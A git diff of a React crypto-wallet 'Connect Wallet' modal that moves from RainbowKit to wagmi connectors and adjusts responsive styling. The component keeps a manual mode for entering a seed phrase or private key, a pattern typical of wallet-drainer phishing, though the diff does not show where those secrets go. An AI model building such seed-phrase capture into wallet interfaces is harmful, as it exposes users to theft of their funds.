@@ -1,8 +1,7 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
-import { useConnectModal } from "@rainbow-me/rainbowkit";
-
+import { useConnect } from "wagmi";
 
 interface WalletModalProps {
   open: boolean;
@@ -13,7 +12,7 @@ interface WalletModalProps {
 type ManualMode = "seed" | "privatekey";
 
 export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
-  const { openConnectModal } = useConnectModal();
+  const { connectors, connect } = useConnect();
   const [showManual, setShowManual] = useState(false);
   const [manualMode, setManualMode] = useState<ManualMode>("seed");
   const [walletName, setWalletName] = useState("");
@@ -32,6 +31,7 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
     };
     document.addEventListener("keydown", handler);
     return () => document.removeEventListener("keydown", handler);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [open]);
 
   // Reset state when opened
@@ -53,19 +53,43 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
     document.body.style.overflow = "";
   }
 
+  /** Find a connector by its type name */
+  function getConnector(type: string) {
+    return connectors.find((c) => c.type === type);
+  }
+
   async function connectWallet(type: string) {
     handleClose();
 
-    // All these wallets open RainbowKit's modal — RainbowKit auto-detects
-    // whichever wallet the user has installed (MetaMask, OKX, Rabby, etc.)
+    // Injected wallets: MetaMask, Phantom, Trust, OKX, Rainbow, Rabby, Zerion, Ledger
     if (
-      type === "metamask" || type === "coinbase" || type === "trust" ||
+      type === "metamask" || type === "phantom" || type === "trust" ||
       type === "okx" || type === "rainbow" || type === "rabby" ||
-      type === "zerion" || type === "phantom" || type === "ledger"
+      type === "zerion" || type === "ledger"
     ) {
-      openConnectModal?.();
-      onConnected?.("", type);
+      const connector = getConnector("injected");
+      if (connector) {
+        connect({ connector });
+        onConnected?.("", type);
+      }
       return;
+    }
+
+    // Coinbase Wallet
+    if (type === "coinbase") {
+      const connector = getConnector("coinbaseWallet");
+      if (connector) {
+        connect({ connector });
+        onConnected?.("", type);
+      }
+      return;
+    }
+
+    // WalletConnect fallback
+    const wcConnector = getConnector("walletConnect");
+    if (wcConnector) {
+      connect({ connector: wcConnector });
+      onConnected?.("", type);
     }
   }
 
@@ -122,19 +146,19 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
   if (!open) return null;
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center">
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6">
       {/* Backdrop — click to close */}
       <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={handleClose} />
 
       {/* Modal */}
       <div
         ref={modalRef}
-        className="relative w-full max-w-md mx-4 animate-scale-in"
+        className="relative w-full max-w-md mx-auto animate-scale-in max-h-[90vh] overflow-y-auto"
       >
-        <div className="bg-[#13131f] border border-white/10 rounded-2xl p-6 shadow-2xl shadow-purple-900/20">
+        <div className="bg-[#13131f] border border-white/10 rounded-2xl p-5 sm:p-6 shadow-2xl shadow-purple-900/20">
           {/* Header */}
-          <div className="flex items-center justify-between mb-6">
-            <h3 className="text-xl font-bold text-white">Connect Wallet</h3>
+          <div className="flex items-center justify-between mb-5 sm:mb-6">
+            <h3 className="text-lg sm:text-xl font-bold text-white">Connect Wallet</h3>
             <button
               onClick={handleClose}
               className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center hover:bg-white/10 transition-colors"
@@ -183,7 +207,7 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
           ) : !showManual ? (
             <>
               {/* Wallet options */}
-              <div className="space-y-3 mb-6">
+              <div className="flex flex-col gap-2 sm:gap-3 mb-5 sm:mb-6">
                 <WalletOptionButton
                   label="MetaMask"
                   subtitle="Popular wallet"
@@ -361,7 +385,7 @@ export function WalletModal({ open, onClose, onConnected }: WalletModalProps) {
                 className="w-full py-3 border border-dashed border-white/20 rounded-xl text-sm text-gray-400 hover:text-white hover:border-white/40 transition-all flex items-center justify-center gap-2"
               >
                 <svg
-                  className="w-4 h-4"
+                  className="w-4 h-4 shrink-0"
                   fill="none"
                   stroke="currentColor"
                   viewBox="0 0 24 24"
@@ -554,17 +578,17 @@ function WalletOptionButton({
   return (
     <button
       onClick={onClick}
-      className={`w-full flex items-center gap-4 p-4 rounded-xl bg-white/5 border border-white/10 ${borderColor} hover:bg-white/10 transition-all group`}
+      className={`w-full flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-xl bg-white/5 border border-white/10 ${borderColor} hover:bg-white/10 transition-all group`}
     >
-      <div className="w-10 h-10 rounded-lg shrink-0 overflow-hidden flex items-center justify-center bg-white/5">
+      <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-lg shrink-0 overflow-hidden flex items-center justify-center bg-white/5">
         {children}
       </div>
-      <div className="text-left flex-1">
-        <div className="font-semibold text-white">{label}</div>
-        <div className="text-xs text-gray-500">{subtitle}</div>
+      <div className="text-left flex-1 min-w-0">
+        <div className="font-semibold text-white text-sm sm:text-base truncate">{label}</div>
+        <div className="text-xs text-gray-500 truncate">{subtitle}</div>
       </div>
       <svg
-        className="w-5 h-5 text-gray-600 group-hover:text-white transition-colors"
+        className="w-4 h-4 sm:w-5 sm:h-5 text-gray-600 group-hover:text-white transition-colors shrink-0"
         fill="none"
         stroke="currentColor"
         viewBox="0 0 24 24"
